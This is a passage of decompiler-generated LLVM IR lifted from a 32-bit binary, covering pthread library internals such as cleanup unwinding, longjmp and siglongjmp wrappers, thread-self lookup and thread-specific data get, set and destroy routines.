  %v1_804f469 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80633a8.193 to i32))
  %v2_804f479 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f479, i32* @ebx, align 4
  %v1_804f47a = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_80633c0.194 to i32))
  ret i32 %v1_804f47a

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_80633c0.194, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80633c0.194 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80633a8.193 to i32), { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9 }
}

define i32 @pthread_cleanup_upto(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-480 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f482 = load i32, i32* @eax, align 4
  store i32 %v0_804f482, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80626c0 to i32), i32* %esi.global-to-local, align 4
  %v0_804f48a = load i32, i32* @ebx, align 4
  store i32 %v0_804f48a, i32* %stack_var_-16, align 4
  %v4_804f48a = ptrtoint i32* %stack_var_-16 to i32
  %v1_804f492 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804f492 = icmp ult i32 %v4_804f48a, %v1_804f492
  %v1_804f498 = icmp eq i1 %v7_804f492, false
  br i1 %v1_804f498, label %dec_label_pc_804f4d0, label %dec_label_pc_804f49a

dec_label_pc_804f49a:                             ; preds = %entry
  %v1_804f49a = load i32, i32* @global_var_8063390.134, align 16
  %v7_804f49a = icmp ult i32 %v4_804f48a, %v1_804f49a
  br i1 %v7_804f49a, label %dec_label_pc_804f4af, label %dec_label_pc_804f4a2

dec_label_pc_804f4a2:                             ; preds = %dec_label_pc_804f49a
  %v1_804f4a2 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804f4a2 = icmp ult i32 %v4_804f48a, %v1_804f4a2
  store i32 ptrtoint (i32* @global_var_80628a0.136 to i32), i32* %esi.global-to-local, align 4
  br i1 %v7_804f4a2, label %dec_label_pc_804f4d0, label %dec_label_pc_804f4af

dec_label_pc_804f4af:                             ; preds = %dec_label_pc_804f4a2, %dec_label_pc_804f49a
  %v0_804f4af = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804f4af = icmp eq i32 %v0_804f4af, 0
  br i1 %v1_804f4af, label %dec_label_pc_804f4c5, label %dec_label_pc_804f4b8

dec_label_pc_804f4b8:                             ; preds = %dec_label_pc_804f4af
  %v0_804f4b8 = call i32 @__pthread_find_self()
  store i32 %v0_804f4b8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f4d0

dec_label_pc_804f4c1:                             ; preds = %dec_label_pc_804f4d9
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f4f4

dec_label_pc_804f4c5:                             ; preds = %dec_label_pc_804f4af
  %v2_804f4ca = ptrtoint i32* %stack_var_-480 to i32
  store i32 %v2_804f4ca, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f4d0

dec_label_pc_804f4d0:                             ; preds = %dec_label_pc_804f4a2, %entry, %dec_label_pc_804f4b8, %dec_label_pc_804f4c5
  %v0_804f4d0 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804f4a2 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v0_804f4b8, %dec_label_pc_804f4b8 ], [ %v2_804f4ca, %dec_label_pc_804f4c5 ]
  %v1_804f4d0 = add i32 %v0_804f4d0, 60
  %v2_804f4d0 = inttoptr i32 %v1_804f4d0 to i32*
  %v3_804f4d0 = load i32, i32* %v2_804f4d0, align 4
  store i32 %v3_804f4d0, i32* %ebx.global-to-local, align 4
  store i32 %v4_804f48a, i32* %ebp.global-to-local, align 4
  %v1_804f4eb2 = icmp eq i32 %v3_804f4d0, 0
  br i1 %v1_804f4eb2, label %dec_label_pc_804f4f4, label %dec_label_pc_804f4ef.lr.ph

dec_label_pc_804f4ef.lr.ph:                       ; preds = %dec_label_pc_804f4d0
  br label %dec_label_pc_804f4ef

dec_label_pc_804f4d9:                             ; preds = %dec_label_pc_804f4ef
  %v1_804f4d9 = load i32, i32* %ebp.global-to-local, align 4
  %tmp = icmp ugt i32 %v4_804f4e3, %v1_804f4d9
  br i1 %tmp, label %dec_label_pc_804f4dd, label %dec_label_pc_804f4c1

dec_label_pc_804f4dd:                             ; preds = %dec_label_pc_804f4d9
  %v5_804f4e3 = inttoptr i32 %v4_804f4e3 to i32*
  %v6_804f4e3 = load i32, i32* %v5_804f4e3, align 4
  call void @__pseudo_call(i32 %v6_804f4e3)
  %v0_804f4e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f4e5 = add i32 %v0_804f4e5, 12
  %v2_804f4e5 = inttoptr i32 %v1_804f4e5 to i32*
  %v3_804f4e5 = load i32, i32* %v2_804f4e5, align 4
  store i32 %v3_804f4e5, i32* %ebx.global-to-local, align 4
  %v1_804f4eb = icmp eq i32 %v3_804f4e5, 0
  br i1 %v1_804f4eb, label %dec_label_pc_804f4f4, label %dec_label_pc_804f4ef

dec_label_pc_804f4ef:                             ; preds = %dec_label_pc_804f4ef.lr.ph, %dec_label_pc_804f4dd
  %v4_804f4e3 = phi i32 [ %v3_804f4d0, %dec_label_pc_804f4ef.lr.ph ], [ %v3_804f4e5, %dec_label_pc_804f4dd ]
  %v1_804f4ef = load i32, i32* %edi.global-to-local, align 4
  %v2_804f4ef = add i32 %v1_804f4ef, 16
  %v3_804f4ef = inttoptr i32 %v2_804f4ef to i32*
  %v4_804f4ef = load i32, i32* %v3_804f4ef, align 4
  %v10_804f4ef = icmp ult i32 %v4_804f4e3, %v4_804f4ef
  br i1 %v10_804f4ef, label %dec_label_pc_804f4d9, label %dec_label_pc_804f4f4

dec_label_pc_804f4f4:                             ; preds = %dec_label_pc_804f4dd, %dec_label_pc_804f4ef, %dec_label_pc_804f4d0, %dec_label_pc_804f4c1
  %v0_804f4f7 = phi i32 [ 0, %dec_label_pc_804f4c1 ], [ 0, %dec_label_pc_804f4d0 ], [ %v4_804f4e3, %dec_label_pc_804f4ef ], [ 0, %dec_label_pc_804f4dd ]
  %v0_804f4f4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f4f4 = add i32 %v0_804f4f4, 84
  %v2_804f4f4 = inttoptr i32 %v1_804f4f4 to i32*
  %v3_804f4f4 = load i32, i32* %v2_804f4f4, align 4
  %v2_804f4f7 = add i32 %v0_804f4f4, 60
  %v3_804f4f7 = inttoptr i32 %v2_804f4f7 to i32*
  store i32 %v0_804f4f7, i32* %v3_804f4f7, align 4
  %v1_804f4fa = icmp eq i32 %v3_804f4f4, 0
  br i1 %v1_804f4fa, label %dec_label_pc_804f50a, label %dec_label_pc_804f4fe

dec_label_pc_804f4fe:                             ; preds = %dec_label_pc_804f4f4
  %v1_804f4fe = load i32, i32* %edi.global-to-local, align 4
  %v2_804f4fe = add i32 %v1_804f4fe, 16
  %v3_804f4fe = inttoptr i32 %v2_804f4fe to i32*
  %v4_804f4fe = load i32, i32* %v3_804f4fe, align 4
  %v10_804f4fe = icmp ult i32 %v3_804f4f4, %v4_804f4fe
  %v1_804f501 = icmp eq i1 %v10_804f4fe, false
  br i1 %v1_804f501, label %dec_label_pc_804f50a, label %dec_label_pc_804f503

dec_label_pc_804f503:                             ; preds = %dec_label_pc_804f4fe
  %v0_804f503 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f503 = add i32 %v0_804f503, 84
  %v2_804f503 = inttoptr i32 %v1_804f503 to i32*
  store i32 0, i32* %v2_804f503, align 4
  br label %dec_label_pc_804f50a

dec_label_pc_804f50a:                             ; preds = %dec_label_pc_804f4fe, %dec_label_pc_804f4f4, %dec_label_pc_804f503
  %v2_804f50d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f50d, i32* @ebx, align 4
  ret i32 %v3_804f4f4

; uselistorder directives
  uselistorder i32 %v3_804f4f4, { 2, 0, 1 }
  uselistorder i32 %v4_804f4e3, { 1, 3, 0, 2 }
  uselistorder i32 %v3_804f4e5, { 1, 0, 2 }
  uselistorder i32 %v4_804f48a, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804f50a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f4f4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f4ef, { 1, 0 }
  uselistorder label %dec_label_pc_804f4d0, { 3, 2, 0, 1 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f512 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804f51c = call i32 @pthread_cleanup_upto(i32 %v0_804f512)
  %v0_804f527 = load i32, i32* @ebx, align 4
  %v4_804f528 = call i32 @_longjmp(i32 %v0_804f527, i32 %arg2, i32 %v1_804f51c, i32 %v1_804f51c)
  ret i32 %v4_804f528

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804f52d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804f537 = call i32 @pthread_cleanup_upto(i32 %v0_804f52d)
  %v0_804f53c = load i32, i32* @edx, align 4
  %v0_804f542 = load i32, i32* @ebx, align 4
  %v4_804f543 = call i32 @_longjmp(i32 %v0_804f542, i32 %arg2, i32 %v0_804f53c, i32 %v0_804f53c)
  ret i32 %v4_804f543

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 (i32)* @pthread_cleanup_upto, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804f548 = load i32, i32* @esp, align 4
  %v1_804f548 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804f548 = icmp ult i32 %v0_804f548, %v1_804f548
  %v1_804f555 = icmp eq i1 %v7_804f548, false
  br i1 %v1_804f555, label %dec_label_pc_804f586, label %dec_label_pc_804f557

dec_label_pc_804f557:                             ; preds = %entry
  %v1_804f557 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804f557 = icmp ult i32 %v0_804f548, %v1_804f557
  br i1 %v7_804f557, label %dec_label_pc_804f56c, label %dec_label_pc_804f55f

dec_label_pc_804f55f:                             ; preds = %dec_label_pc_804f557
  %v1_804f55f = load i32, i32* @global_var_8063394.135, align 4
  %v7_804f55f = icmp ult i32 %v0_804f548, %v1_804f55f
  br i1 %v7_804f55f, label %dec_label_pc_804f586, label %dec_label_pc_804f56c

dec_label_pc_804f56c:                             ; preds = %dec_label_pc_804f55f, %dec_label_pc_804f557
  %v0_804f56c = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804f56c = icmp eq i32 %v0_804f56c, 0
  br i1 %v1_804f56c, label %dec_label_pc_804f57a, label %dec_label_pc_804f575

dec_label_pc_804f575:                             ; preds = %dec_label_pc_804f56c
  %v0_804f575 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804f57a

dec_label_pc_804f57a:                             ; preds = %dec_label_pc_804f56c, %dec_label_pc_804f575
  %v2_804f580 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804f586

dec_label_pc_804f586:                             ; preds = %dec_label_pc_804f55f, %entry, %dec_label_pc_804f57a
  %v0_804f586 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804f55f ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804f580, %dec_label_pc_804f57a ]
  ret i32 %v0_804f586

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_80626c0 to i32), { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_80628a0.136 to i32), { 0, 1, 11, 2, 3, 4, 5, 12, 13, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @__pthread_find_self, { 6, 0, 3, 5, 8, 4, 7, 2, 10, 9, 1 }
  uselistorder label %dec_label_pc_804f586, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f57a, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f58a = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_804f598 = mul i32 %arg1, 4
  %v3_804f598 = add i32 %v2_804f598, 364
  %v4_804f598 = add i32 %v3_804f598, %v1_804f58a
  ret i32 %v4_804f598
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f5a3 = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v2_804f5ac = mul i32 %arg1, 4
  %v3_804f5ac = add i32 %v2_804f5ac, 364
  %v4_804f5ac = add i32 %v3_804f5ac, %v1_804f5a3
  %v5_804f5ac = inttoptr i32 %v4_804f5ac to i32*
  %v6_804f5ac = load i32, i32* %v5_804f5ac, align 4
  ret i32 %v6_804f5ac
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804f5ba = call i32 @thread_self.19(i32 ptrtoint (i32* @0 to i32))
  %v3_804f5c7 = mul i32 %arg1, 4
  %v4_804f5c7 = add i32 %v3_804f5c7, 364
  %v5_804f5c7 = add i32 %v4_804f5c7, %v1_804f5ba
  %v6_804f5c7 = inttoptr i32 %v5_804f5c7 to i32*
  store i32 %arg2, i32* %v6_804f5c7, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 2, 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f5d4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_804f5e2 = icmp ugt i32 %arg1, 1023
  br i1 %v6_804f5e2, label %dec_label_pc_804f60b, label %dec_label_pc_804f5e4

dec_label_pc_804f5e4:                             ; preds = %entry
  %v1_804f5e4 = call i32 @thread_self.19(i32 %v0_804f5d4)
  %v0_804f5e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f5eb = udiv i32 %v0_804f5e9, 32
  %v2_804f5ee = mul nuw nsw i32 %v2_804f5eb, 4
  %v3_804f5ee = add i32 %v1_804f5e4, 236
  %v4_804f5ee = add i32 %v3_804f5ee, %v2_804f5ee
  %v5_804f5ee = inttoptr i32 %v4_804f5ee to i32*
  %v6_804f5ee = load i32, i32* %v5_804f5ee, align 4
  %v1_804f5f5 = icmp eq i32 %v6_804f5ee, 0
  br i1 %v1_804f5f5, label %dec_label_pc_804f60b, label %dec_label_pc_804f5f9

dec_label_pc_804f5f9:                             ; preds = %dec_label_pc_804f5e4
  %v1_804f5f9 = mul i32 %v0_804f5e9, 8
  %v2_804f5f9 = add i32 %v1_804f5f9, ptrtoint (i32* @global_var_80633e0.197 to i32)
  %v3_804f5f9 = inttoptr i32 %v2_804f5f9 to i32*
  %v4_804f5f9 = load i32, i32* %v3_804f5f9, align 8
  %v5_804f5f9 = icmp eq i32 %v4_804f5f9, 0
  br i1 %v5_804f5f9, label %dec_label_pc_804f60b, label %dec_label_pc_804f603

dec_label_pc_804f603:                             ; preds = %dec_label_pc_804f5f9
  %v1_804f603 = urem i32 %v0_804f5e9, 32
  store i32 %v1_804f603, i32* %ebx.global-to-local, align 4
  %v2_804f606 = mul nuw nsw i32 %v1_804f603, 4
  %v3_804f606 = add i32 %v2_804f606, %v6_804f5ee
  %v4_804f606 = inttoptr i32 %v3_804f606 to i32*
  %v5_804f606 = load i32, i32* %v4_804f606, align 4
  br label %dec_label_pc_804f60d

dec_label_pc_804f60b:                             ; preds = %dec_label_pc_804f5f9, %dec_label_pc_804f5e4, %entry
  br label %dec_label_pc_804f60d

dec_label_pc_804f60d:                             ; preds = %dec_label_pc_804f603, %dec_label_pc_804f60b
  %storemerge = phi i32 [ %v5_804f606, %dec_label_pc_804f603 ], [ 0, %dec_label_pc_804f60b ]
  store i32 %v0_804f5d4, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f603, { 1, 0 }
  uselistorder i32 %v0_804f5e9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f60d, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
dec_label_pc_804f68a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f611 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804f614 = load i32, i32* @edi, align 4
  %v0_804f615 = load i32, i32* @esi, align 4
  %v0_804f616 = load i32, i32* @ebx, align 4
  store i32 %v0_804f616, i32* %stack_var_-16, align 4
  %v1_804f61a = call i32 @thread_self.19(i32 %v0_804f616)
  store i32 %v1_804f61a, i32* @esi, align 4
  %v0_804f68a.pre = load i32, i32* @ebp, align 4
  %v1_804f68a = add i32 %v0_804f68a.pre, -3
  %v6_804f68a = sub i32 2, %v0_804f68a.pre
  %v7_804f68a = and i32 %v6_804f68a, %v0_804f68a.pre
  %v8_804f68a = icmp slt i32 %v7_804f68a, 0
  %v9_804f68a = icmp eq i32 %v1_804f68a, 0
  %v10_804f68a = icmp slt i32 %v1_804f68a, 0
  %v3_804f68d = icmp eq i1 %v10_804f68a, %v8_804f68a
  %v4_804f68d = icmp eq i1 %v9_804f68a, false
  %v5_804f68d = and i1 %v4_804f68d, %v3_804f68d
  br i1 %v5_804f68d, label %dec_label_pc_804f69b, label %dec_label_pc_804f68f

dec_label_pc_804f62b:                             ; preds = %dec_label_pc_804f67c.dec_label_pc_804f62b_crit_edge, %dec_label_pc_804f68f
  %v0_804f62d = phi i32 [ %v1_804f61a, %dec_label_pc_804f68f ], [ %v0_804f62d.pre, %dec_label_pc_804f67c.dec_label_pc_804f62b_crit_edge ]
  %v0_804f67c.pre27 = phi i32 [ 0, %dec_label_pc_804f68f ], [ %v1_804f67c, %dec_label_pc_804f67c.dec_label_pc_804f62b_crit_edge ]
  store i32 0, i32* @edi, align 4
  %v2_804f62d = mul i32 %v0_804f67c.pre27, 4
  %v3_804f62d = add i32 %v2_804f62d, 236
  %v4_804f62d = add i32 %v3_804f62d, %v0_804f62d
  %v5_804f62d = inttoptr i32 %v4_804f62d to i32*
  %v6_804f62d = load i32, i32* %v5_804f62d, align 4
  %v7_804f62d = icmp eq i32 %v6_804f62d, 0
  %v1_804f635 = icmp eq i1 %v7_804f62d, false
  br i1 %v1_804f635, label %dec_label_pc_804f677.preheader, label %dec_label_pc_804f67c

dec_label_pc_804f677.preheader:                   ; preds = %dec_label_pc_804f62b
  br label %dec_label_pc_804f639

dec_label_pc_804f639:                             ; preds = %dec_label_pc_804f676.dec_label_pc_804f639_crit_edge, %dec_label_pc_804f677.preheader
  %v1_804f64e = phi i32 [ %v0_804f62d, %dec_label_pc_804f677.preheader ], [ %v1_804f64e.pre, %dec_label_pc_804f676.dec_label_pc_804f639_crit_edge ]
  %v0_804f67c.pre29 = phi i32 [ %v0_804f67c.pre27, %dec_label_pc_804f677.preheader ], [ %v0_804f67c.pre, %dec_label_pc_804f676.dec_label_pc_804f639_crit_edge ]
  %v0_804f64728 = phi i32 [ 0, %dec_label_pc_804f677.preheader ], [ %v1_804f676, %dec_label_pc_804f676.dec_label_pc_804f639_crit_edge ]
  %v2_804f63b = mul i32 %v0_804f67c.pre29, 32
  %v2_804f63e = add i32 %v2_804f63b, %v0_804f64728
  %v1_804f640 = mul i32 %v2_804f63e, 8
  %v2_804f640 = add i32 %v1_804f640, ptrtoint (i32* @global_var_80633e4.198 to i32)
  %v3_804f640 = inttoptr i32 %v2_804f640 to i32*
  %v4_804f640 = load i32, i32* %v3_804f640, align 4
  %v1_804f655 = icmp eq i32 %v4_804f640, 0
  br i1 %v1_804f655, label %dec_label_pc_804f676, label %dec_label_pc_804f65b

dec_label_pc_804f65b:                             ; preds = %dec_label_pc_804f639
  %v3_804f64e = mul i32 %v0_804f67c.pre29, 4
  %v4_804f64e = add i32 %v3_804f64e, 236
  %v5_804f64e = add i32 %v4_804f64e, %v1_804f64e
  %v6_804f64e = inttoptr i32 %v5_804f64e to i32*
  %v7_804f64e = load i32, i32* %v6_804f64e, align 4
  %v1_804f647 = mul i32 %v0_804f64728, 4
  %v8_804f64e = add i32 %v7_804f64e, %v1_804f647
  %v1_804f657 = inttoptr i32 %v8_804f64e to i32*
  store i32 0, i32* %v1_804f657, align 4
  call void @__pseudo_call(i32 %v4_804f640)
  %v0_804f676.pre = load i32, i32* @edi, align 4
  %v0_804f67c.pre.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f676

dec_label_pc_804f676:                             ; preds = %dec_label_pc_804f639, %dec_label_pc_804f65b
  %v0_804f67c.pre = phi i32 [ %v0_804f67c.pre29, %dec_label_pc_804f639 ], [ %v0_804f67c.pre.pre, %dec_label_pc_804f65b ]
  %v0_804f676 = phi i32 [ %v0_804f64728, %dec_label_pc_804f639 ], [ %v0_804f676.pre, %dec_label_pc_804f65b ]
  %v1_804f676 = add i32 %v0_804f676, 1
  store i32 %v1_804f676, i32* @edi, align 4
  %v7_804f67a = icmp sgt i32 %v1_804f676, 31
  br i1 %v7_804f67a, label %dec_label_pc_804f67c, label %dec_label_pc_804f676.dec_label_pc_804f639_crit_edge

dec_label_pc_804f676.dec_label_pc_804f639_crit_edge: ; preds = %dec_label_pc_804f676
  %v1_804f64e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f639

dec_label_pc_804f67c:                             ; preds = %dec_label_pc_804f676, %dec_label_pc_804f62b
  %v0_804f67c = phi i32 [ %v0_804f67c.pre27, %dec_label_pc_804f62b ], [ %v0_804f67c.pre, %dec_label_pc_804f676 ]
  %v1_804f67c = add i32 %v0_804f67c, 1
  store i32 %v1_804f67c, i32* %ebx.global-to-local, align 4
  %v7_804f680 = icmp sgt i32 %v1_804f67c, 31
  br i1 %v7_804f680, label %dec_label_pc_804f682, label %dec_label_pc_804f67c.dec_label_pc_804f62b_crit_edge

dec_label_pc_804f67c.dec_label_pc_804f62b_crit_edge: ; preds = %dec_label_pc_804f67c
  %v0_804f62d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f62b

dec_label_pc_804f682:                             ; preds = %dec_label_pc_804f67c
  %v0_804f682 = load i32, i32* @ebp, align 4
  %v1_804f682 = add i32 %v0_804f682, 1
  store i32 %v1_804f682, i32* @ebp, align 4
  %v0_804f69b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f69b

dec_label_pc_804f68f:                             ; preds = %dec_label_pc_804f68a
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f62b

dec_label_pc_804f69b:                             ; preds = %dec_label_pc_804f682, %dec_label_pc_804f68a
  %v0_804f69b = phi i32 [ %v1_804f61a, %dec_label_pc_804f68a ], [ %v0_804f69b.pre, %dec_label_pc_804f682 ]
  %stack_var_-20.0.lcssa = phi i32 [ 1, %dec_label_pc_804f68a ], [ 0, %dec_label_pc_804f682 ]
  %v1_804f69b = add i32 %v0_804f69b, 28
  %v2_804f69b = inttoptr i32 %v1_804f69b to i32*
  %v3_804f69b = load i32, i32* %v2_804f69b, align 4
  store i32 %v3_804f69b, i32* @eax, align 4
  store i32 %v0_804f69b, i32* @edx, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f6a2 = call i32 @__pthread_lock(i32 %stack_var_-20.0.lcssa)
  %v0_804f6cc.pr = load i32, i32* @ebx, align 4
  %v7_804f6cf25 = icmp sgt i32 %v0_804f6cc.pr, 31
  br i1 %v7_804f6cf25, label %dec_label_pc_804f6d1, label %dec_label_pc_804f6a9

dec_label_pc_804f6a9:                             ; preds = %dec_label_pc_804f69b, %dec_label_pc_804f6cb
  %v1_804f6a926 = phi i32 [ %v1_804f6cb, %dec_label_pc_804f6cb ], [ %v0_804f6cc.pr, %dec_label_pc_804f69b ]
  %v0_804f6a9 = load i32, i32* @esi, align 4
  %v2_804f6a9 = mul i32 %v1_804f6a926, 4
  %v3_804f6a9 = add i32 %v2_804f6a9, 236
  %v4_804f6a9 = add i32 %v3_804f6a9, %v0_804f6a9
  %v5_804f6a9 = inttoptr i32 %v4_804f6a9 to i32*
  %v6_804f6a9 = load i32, i32* %v5_804f6a9, align 4
  %v1_804f6b0 = icmp eq i32 %v6_804f6a9, 0
  br i1 %v1_804f6b0, label %dec_label_pc_804f6cb, label %dec_label_pc_804f6b4

dec_label_pc_804f6b4:                             ; preds = %dec_label_pc_804f6a9
  %v1_804f6b8 = call i32 @free(i32 %v6_804f6a9)
  %v0_804f6c0 = load i32, i32* @esi, align 4
  %v1_804f6c0 = load i32, i32* @ebx, align 4
  %v2_804f6c0 = mul i32 %v1_804f6c0, 4
  %v3_804f6c0 = add i32 %v0_804f6c0, 236
  %v4_804f6c0 = add i32 %v3_804f6c0, %v2_804f6c0
  %v5_804f6c0 = inttoptr i32 %v4_804f6c0 to i32*
  store i32 0, i32* %v5_804f6c0, align 4
  %v0_804f6cb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f6cb

dec_label_pc_804f6cb:                             ; preds = %dec_label_pc_804f6a9, %dec_label_pc_804f6b4
  %v0_804f6cb = phi i32 [ %v1_804f6a926, %dec_label_pc_804f6a9 ], [ %v0_804f6cb.pre, %dec_label_pc_804f6b4 ]
  %v1_804f6cb = add i32 %v0_804f6cb, 1
  store i32 %v1_804f6cb, i32* @ebx, align 4
  %v7_804f6cf = icmp sgt i32 %v1_804f6cb, 31
  br i1 %v7_804f6cf, label %dec_label_pc_804f6d1, label %dec_label_pc_804f6a9

dec_label_pc_804f6d1:                             ; preds = %dec_label_pc_804f6cb, %dec_label_pc_804f69b
  %v0_804f6d4 = load i32, i32* @esi, align 4
  %v1_804f6d4 = add i32 %v0_804f6d4, 28
  %v2_804f6d4 = inttoptr i32 %v1_804f6d4 to i32*
  %v3_804f6d4 = load i32, i32* %v2_804f6d4, align 4
  %v1_804f6d7 = inttoptr i32 %v3_804f6d4 to i32*
  %v2_804f6d7 = call i32 @__pthread_unlock(i32* %v1_804f6d7)
  %v2_804f6df = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f6df, i32* @ebx, align 4
  store i32 %v0_804f615, i32* @esi, align 4
  store i32 %v0_804f614, i32* @edi, align 4
  store i32 %v0_804f611, i32* @ebp, align 4
  ret i32 %v2_804f6d7

; uselistorder directives
  uselistorder i32 %v1_804f6cb, { 1, 2, 0 }
  uselistorder i32 %v1_804f6a926, { 1, 0 }
  uselistorder i32 %v0_804f69b, { 1, 0 }
  uselistorder i32 %v1_804f67c, { 1, 0, 2 }
  uselistorder i32 %v1_804f676, { 0, 2, 1 }
  uselistorder i32 %v0_804f64728, { 1, 0, 2 }
  uselistorder i32 %v0_804f67c.pre29, { 1, 2, 0 }
  uselistorder i32 %v0_804f67c.pre27, { 2, 0, 1 }
  uselistorder i32 %v1_804f68a, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 42, 50, 7, 8, 9, 10, 43, 44, 46, 47, 48, 49, 3, 45, 11, 37, 12, 13, 4, 41, 38, 14, 15, 16, 17, 18, 19, 20, 21, 22, 39, 40, 23, 24, 25, 26, 27, 28, 29, 31, 32, 5, 33, 30, 34, 0, 1, 2, 36, 35, 6 }
  uselistorder i32 (i32)* @__pthread_lock, { 6, 1, 0, 29, 28, 27, 5, 3, 2, 33, 4, 26, 10, 25, 24, 32, 7, 9, 23, 22, 21, 20, 8, 19, 18, 17, 15, 31, 14, 16, 13, 35, 34, 11, 12, 30 }
  uselistorder label %dec_label_pc_804f6cb, { 1, 0 }
  uselistorder label %dec_label_pc_804f6a9, { 1, 0 }
  uselistorder label %dec_label_pc_804f676, { 1, 0 }
  uselistorder label %dec_label_pc_804f62b, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f6e6 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804f6f1 = icmp ugt i32 %arg1, 1023
  br i1 %v6_804f6f1, label %dec_label_pc_804f748, label %dec_label_pc_804f6f3

dec_label_pc_804f6f3:                             ; preds = %entry
  %v1_804f6f3 = mul i32 %arg1, 8
  %v2_804f6f3 = add i32 %v1_804f6f3, ptrtoint (i32* @global_var_80633e0.197 to i32)
  %v3_804f6f3 = inttoptr i32 %v2_804f6f3 to i32*
  %v4_804f6f3 = load i32, i32* %v3_804f6f3, align 8
  %v5_804f6f3 = icmp eq i32 %v4_804f6f3, 0
  br i1 %v5_804f6f3, label %dec_label_pc_804f748, label %dec_label_pc_804f6fd

dec_label_pc_804f6fd:                             ; preds = %dec_label_pc_804f6f3
  %v1_804f6fd = call i32 @thread_self.19(i32 %v0_804f6e6)
